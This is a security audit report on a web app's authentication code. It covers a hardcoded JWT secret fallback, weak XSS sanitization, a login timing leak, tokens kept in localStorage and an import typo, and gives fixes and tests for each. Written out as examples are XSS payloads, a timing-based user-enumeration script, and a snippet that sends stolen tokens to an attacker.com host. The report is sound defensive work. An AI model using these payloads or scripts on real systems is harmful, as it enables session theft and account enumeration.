# Critical Security Issues - Stage 2 Authentication

**Status:** ⚠️ MUST FIX BEFORE PRODUCTION
**Discovered:** 2025-12-26
**Total Critical Issues:** 5

---

## ISSUE-001: JWT Secret Fallback Vulnerability

**Severity:** ❌ CRITICAL
**Status:** OPEN
**File:** `/src/lib/auth.ts`
**Line:** 12
**Category:** Security - Secret Management

### Description
JWT_SECRET has a hardcoded fallback value that allows the application to silently use a weak, publicly known secret in production if the environment variable is not set.

### Current Code
```typescript
const JWT_SECRET = process.env.JWT_SECRET || 'development-secret-change-in-production';
```

### Vulnerability
- If `JWT_SECRET` environment variable is accidentally omitted in production, the app uses the known fallback
- Attackers can check for this default to forge admin tokens
- Silent failure - no error or warning that weak secret is in use
- Anyone with access to the code knows the fallback secret

### Impact
- Complete authentication bypass possible
- Attackers can forge valid JWT tokens for any user
- Session hijacking trivial
- No authentication security whatsoever

### Exploit Scenario
1. Developer forgets to set JWT_SECRET in production
2. App deploys successfully with fallback secret
3. Attacker sees public repo or decompiles code
4. Attacker uses known secret to forge JWT for admin@example.com
5. Attacker gains full access to admin account

### Recommended Fix
```typescript
const JWT_SECRET = process.env.JWT_SECRET;

if (!JWT_SECRET) {
  throw new Error('FATAL: JWT_SECRET environment variable is required. Application cannot start without it.');
}
```

### Alternative Fix (with warning)
```typescript
const JWT_SECRET = process.env.JWT_SECRET;

if (!JWT_SECRET) {
  if (process.env.NODE_ENV === 'production') {
    throw new Error('FATAL: JWT_SECRET must be set in production');
  }
  console.warn('⚠️  WARNING: Using development JWT secret. DO NOT use in production!');
  JWT_SECRET = 'development-secret-change-in-production';
}
```

### Testing
After fix, verify:
1. App fails to start without JWT_SECRET in production
2. Clear error message displayed
3. Development mode allows fallback (with warning)

### Priority
**IMMEDIATE** - Block production deployment until fixed

---

## ISSUE-002: XSS Sanitization Insufficient

**Severity:** ❌ CRITICAL
**Status:** OPEN
**File:** `/src/lib/auth.ts`
**Lines:** 132-138
**Category:** Security - XSS Prevention

### Description
Manual HTML sanitization function is insufficient and vulnerable to multiple bypass techniques.

### Current Code
```typescript
export function sanitizeInput(input: string): string {
  return input
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}
```

### Vulnerabilities

#### 1. Missing Backticks
Template literal injection not prevented:
```javascript
const name = sanitizeInput("`${alert(1)}`");
// Backticks not escaped, can be used in template contexts
```

#### 2. URL Context Not Handled
```javascript
const name = sanitizeInput("javascript:alert(1)");
// If used in href attribute, executes JavaScript
```

#### 3. Event Handler Injection
```html
<!-- After sanitization: -->
<div title="x" onmouseover=alert(1)>
<!-- Event handlers not prevented -->
```

#### 4. Incomplete Entity Encoding
Many special characters and Unicode variants not covered

### Impact
- XSS attacks possible through user input (name field)
- Stored XSS if data saved to database
- Session theft via XSS
- Credential harvesting
- Malicious script injection

### Exploit Scenario
1. Attacker registers with name: `<img src=x onerror=alert(document.cookie)>`
2. Current sanitization escapes < and >, but may miss edge cases
3. Or attacker uses: `` `${alert(1)}` `` (backticks not sanitized)
4. When name displayed, XSS executes
5. Attacker steals tokens from localStorage (ISSUE-004)

### Recommended Fix

#### Option 1: Use DOMPurify (Recommended)
```typescript
import DOMPurify from 'dompurify';

export function sanitizeInput(input: string): string {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: [], // Strip all HTML
    KEEP_CONTENT: true
  });
}
```

#### Option 2: Use xss library
```typescript
import xss from 'xss';

export function sanitizeInput(input: string): string {
  return xss(input, {
    whiteList: {}, // No HTML allowed
    stripIgnoreTag: true
  });
}
```

#### Option 3: Just strip HTML (simple)
```typescript
export function sanitizeInput(input: string): string {
  // Remove all HTML tags completely
  return input.replace(/<[^>]*>/g, '');
}
```

### Installation
```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

### Testing
After fix, verify these are safe:
```typescript
sanitizeInput("<script>alert(1)</script>"); // No script execution
sanitizeInput("`${alert(1)}`"); // No template injection
sanitizeInput("javascript:alert(1)"); // Safe in URL context
sanitizeInput("<img src=x onerror=alert(1)>"); // No event handlers
```

### Priority
**IMMEDIATE** - XSS vulnerabilities are critical

---

## ISSUE-003: Timing Attack in Login Endpoint

**Severity:** ❌ CRITICAL
**Status:** OPEN
**File:** `/src/app/api/auth/login/route.ts`
**Lines:** 45-72
**Category:** Security - User Enumeration

### Description
Login endpoint has timing attack vulnerability that allows attackers to enumerate registered email addresses by measuring response times.

### Vulnerability Analysis

#### Current Flow
```typescript
// Line 46: Find user (fast query, ~5-50ms)
const user = await findUserByEmail(email);

// Line 48: Early return if no user (FAST PATH ~5-50ms)
if (!user) {
  return NextResponse.json(...); // Returns immediately
}

// Line 61: Compare password (SLOW PATH ~200-300ms)
const isPasswordValid = await comparePassword(password, user.password);

// Line 63: Return after bcrypt
if (!isPasswordValid) {
  return NextResponse.json(...); // Returns after bcrypt
}
```

#### Timing Difference
- **Email doesn't exist:** ~5-50ms (database query only)
- **Email exists, wrong password:** ~200-300ms (database query + bcrypt)
- **Difference:** ~150-250ms (easily measurable)

### Attack Scenario

```python
# Attacker script
import time
import requests

def check_email_exists(email):
    start = time.time()
    response = requests.post('/api/auth/login', json={
        'email': email,
        'password': 'wrong_password_12345'
    })
    elapsed = time.time() - start

    # If response is fast, email doesn't exist
    # If response is slow, email exists (bcrypt was run)
    return elapsed > 0.15  # 150ms threshold

# Test emails
emails = ['admin@example.com', 'user@example.com', 'test@example.com']
for email in emails:
    if check_email_exists(email):
        print(f"✓ {email} is registered")
    else:
        print(f"✗ {email} not found")
```

### Impact
- Attackers can enumerate all registered users
- Privacy violation - reveals who has accounts
- Enables targeted phishing attacks
- Bypasses "generic error message" security measure
- GDPR/privacy compliance issue

### Recommended Fix

```typescript
export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { email, password } = body;

    // ... validation ...

    // Find user
    const user = await findUserByEmail(email);

    // ALWAYS run bcrypt.compare, even if user doesn't exist
    // Use a dummy hash if no user found
    const dummyHash = '$2a$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5GyYNhJ6LvqOm';
    const hashToCompare = user ? user.password : dummyHash;

    // This takes ~200ms regardless of whether user exists
    const isPasswordValid = await comparePassword(password, hashToCompare);

    // NOW check if user exists and password is valid
    if (!user || !isPasswordValid) {
      return NextResponse.json(
        {
          success: false,
          error: 'INVALID_CREDENTIALS',
          message: 'Invalid email or password',
        },
        { status: 401 }
      );
    }

    // ... success logic ...
  } catch (error) {
    // ... error handling ...
  }
}
```

### Generating Dummy Hash
```bash
# Generate a valid bcrypt hash to use as dummy
node -e "const bcrypt = require('bcryptjs'); console.log(bcrypt.hashSync('dummy', 12));"
```

### Testing
After fix, verify timing is consistent:
```javascript
// Test script
const times = [];

// Test with non-existent email
for (let i = 0; i < 10; i++) {
  const start = Date.now();
  await fetch('/api/auth/login', {
    method: 'POST',
    body: JSON.stringify({ email: 'nonexistent@example.com', password: 'wrong' })
  });
  times.push(Date.now() - start);
}

// Test with existing email
for (let i = 0; i < 10; i++) {
  const start = Date.now();
  await fetch('/api/auth/login', {
    method: 'POST',
    body: JSON.stringify({ email: 'existing@example.com', password: 'wrong' })
  });
  times.push(Date.now() - start);
}

// Times should be similar (within ~50ms variance)
console.log('Average:', times.reduce((a,b) => a+b) / times.length);
console.log('Variance:', Math.max(...times) - Math.min(...times));
```

### Priority
**HIGH** - User enumeration is a serious privacy/security issue

---

## ISSUE-004: LocalStorage Token Storage (XSS Vulnerability)

**Severity:** ❌ CRITICAL
**Status:** OPEN
**Files:**
- `/src/contexts/AuthContext.tsx` (lines 35-36, 68-69)
- `/src/app/login/page.tsx` (lines 51-53)
**Category:** Security - XSS Token Theft

### Description
JWT tokens are stored in localStorage, making them vulnerable to XSS attacks. Additionally, this is redundant since httpOnly cookies are already being used.

### Current Implementation

#### AuthContext.tsx
```typescript
// Line 35-36: Reading from localStorage
const token = localStorage.getItem('token');
const storedUser = localStorage.getItem('user');

// Line 68-69: Writing to localStorage
localStorage.setItem('token', data.data.token);
localStorage.setItem('user', JSON.stringify(data.data.user));
```

#### login/page.tsx
```typescript
// Line 51-53: Also writing to localStorage
if (data.data.token) {
  localStorage.setItem('token', data.data.token);
  localStorage.setItem('user', JSON.stringify(data.data.user));
}
```

### Vulnerability

#### XSS Attack Vector
```javascript
// If attacker achieves XSS on the site (through any vulnerability):
const stolenToken = localStorage.getItem('token');
const stolenUser = localStorage.getItem('user');

// Send to attacker's server
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken, user: stolenUser })
});

// Or use token directly to make authenticated requests
fetch('/api/protected-endpoint', {
  headers: { 'Authorization': `Bearer ${stolenToken}` }
});
```

#### Current XSS Vulnerabilities in App
- ISSUE-002: Insufficient sanitization (name field)
- Any future XSS vulnerability would expose all tokens

### Why This Is Bad

1. **XSS = Game Over:** Any XSS vulnerability immediately compromises all user sessions
2. **Redundant:** Backend already sets httpOnly cookie (lines in login/route.ts:98-104)
3. **Violates Security Best Practice:** Never store sensitive tokens in localStorage
4. **OWASP Recommendation:** Use httpOnly cookies for auth tokens

### HttpOnly Cookie Already Implemented

Backend correctly sets secure cookie:
```typescript
// src/app/api/auth/login/route.ts
response.cookies.set('token', token, {
  httpOnly: true,  // ← Cannot be accessed by JavaScript
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  maxAge: 60 * 60 * 24 * 7,
  path: '/',
});
```

### Recommended Fix

#### Remove all localStorage token storage

**AuthContext.tsx:**
```typescript
// REMOVE THESE LINES:
// const token = localStorage.getItem('token');
// localStorage.setItem('token', data.data.token);
// localStorage.removeItem('token');

// Instead, rely on cookie presence
// Option 1: Check auth status via API call
useEffect(() => {
  const checkAuth = async () => {
    try {
      const response = await fetch('/api/auth/me', {
        credentials: 'include' // Sends httpOnly cookie
      });
      if (response.ok) {
        const { user } = await response.json();
        setUser(user);
      }
    } catch (error) {
      // Not authenticated
    } finally {
      setLoading(false);
    }
  };

  checkAuth();
}, []);

// Option 2: Store only non-sensitive user data
useEffect(() => {
  const storedUser = localStorage.getItem('user');
  if (storedUser) {
    try {
      setUser(JSON.parse(storedUser));
    } catch (error) {
      localStorage.removeItem('user');
    }
  }
  setLoading(false);
}, []);
```

**login/page.tsx:**
```typescript
// REMOVE localStorage token storage
// Cookie is automatically set by backend
// Just update global state via AuthContext

const { login } = useAuth();
await login(formData.email, formData.password);
```

#### Create /api/auth/me endpoint
```typescript
// src/app/api/auth/me/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { verifyToken } from '@/lib/auth';
import { findUserById } from '@/lib/db/users';

export async function GET(request: NextRequest) {
  try {
    // Get token from cookie
    const token = request.cookies.get('token')?.value;

    if (!token) {
      return NextResponse.json(
        { success: false, error: 'Not authenticated' },
        { status: 401 }
      );
    }

    // Verify token
    const decoded = verifyToken(token);
    if (!decoded) {
      return NextResponse.json(
        { success: false, error: 'Invalid token' },
        { status: 401 }
      );
    }

    // Get fresh user data
    const user = await findUserById(decoded.userId);

    if (!user) {
      return NextResponse.json(
        { success: false, error: 'User not found' },
        { status: 404 }
      );
    }

    return NextResponse.json({
      success: true,
      data: { user }
    });
  } catch (error) {
    return NextResponse.json(
      { success: false, error: 'Server error' },
      { status: 500 }
    );
  }
}
```

### Testing
After fix, verify:
1. localStorage does not contain 'token' key after login
2. Authentication still works (cookie is sent automatically)
3. Protected routes still work
4. Logout still clears authentication
5. XSS cannot steal tokens (they're in httpOnly cookie)

### Priority
**IMMEDIATE** - localStorage token storage is a critical XSS vulnerability

---

## ISSUE-005: Registration Page Import Syntax Error

**Severity:** ❌ CRITICAL (Build Breaking)
**Status:** OPEN
**File:** `/src/app/register/page.tsx`
**Line:** 6
**Category:** Build Error - Syntax

### Description
Leading space in import path will cause module resolution error.

### Current Code
```typescript
import { AuthLayout } from ' @/layouts';
//                           ↑ Space before @
```

### Error This Causes
```
Error: Cannot find module ' @/layouts'
Module not found: Can't resolve ' @/layouts'
```

### Impact
- Registration page will fail to render
- Build may succeed but runtime error occurs
- 404 or blank page for /register route
- Blocks user registration completely

### Fix
```typescript
import { AuthLayout } from '@/layouts';
```

### How It Happened
Likely typo during development or copy-paste error

### Testing
After fix, verify:
1. Registration page loads without errors
2. AuthLayout component renders correctly
3. Build succeeds without module resolution warnings

### Priority
**IMMEDIATE** - Breaks registration functionality

---

## Summary of Critical Issues

| Issue | Severity | Impact | Fix Complexity | Priority |
|-------|----------|--------|----------------|----------|
| ISSUE-001: JWT Secret Fallback | CRITICAL | Complete auth bypass | LOW (5 min) | IMMEDIATE |
| ISSUE-002: XSS Sanitization | CRITICAL | XSS attacks possible | LOW (15 min) | IMMEDIATE |
| ISSUE-003: Timing Attack | CRITICAL | User enumeration | LOW (10 min) | HIGH |
| ISSUE-004: localStorage Tokens | CRITICAL | XSS token theft | MEDIUM (30 min) | IMMEDIATE |
| ISSUE-005: Import Syntax Error | CRITICAL | Build breaking | LOW (1 min) | IMMEDIATE |

**Total Estimated Fix Time:** ~1-2 hours
**Blocker for Production:** YES

---

## Remediation Checklist

### Before Next Commit
- [ ] Fix ISSUE-005 (Import syntax - 1 min)
- [ ] Fix ISSUE-001 (JWT secret - 5 min)
- [ ] Fix ISSUE-002 (XSS sanitization - 15 min)
- [ ] Fix ISSUE-003 (Timing attack - 10 min)

### Before Production Deploy
- [ ] Fix ISSUE-004 (localStorage - 30 min)
- [ ] Run full test suite
- [ ] Security audit
- [ ] Penetration testing

---

**Created:** 2025-12-26
**Last Updated:** 2025-12-26
**Status:** All issues OPEN and blocking production
